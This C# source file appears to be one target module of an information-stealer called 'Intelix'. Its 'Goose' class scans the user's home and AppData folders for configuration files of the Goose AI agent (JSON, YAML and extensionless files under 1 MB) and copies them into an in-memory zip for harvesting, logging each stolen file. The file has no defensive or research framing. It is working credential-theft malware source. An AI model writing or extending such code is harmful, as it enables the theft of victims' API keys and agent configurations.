using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Goose : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] paths = {
                Path.Combine(userProfile, ".config", "goose"),
                Path.Combine(appdata, "Goose")
            };
            foreach (string dir in paths)
            {
                if (!Directory.Exists(dir)) continue;
                var entry = new Counter.CounterApplications { Name = "Goose" };
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly))
                {
                    string ext = Path.GetExtension(file).ToLower();
                    if (ext != ".json" && ext != ".yaml" && ext != ".yml" && ext != "") continue;
                    if (new FileInfo(file).Length > 1 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\Goose\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
                if (entry.Files.Count > 0) { counter.AI.Add(entry); break; }
            }
        }
    }
}
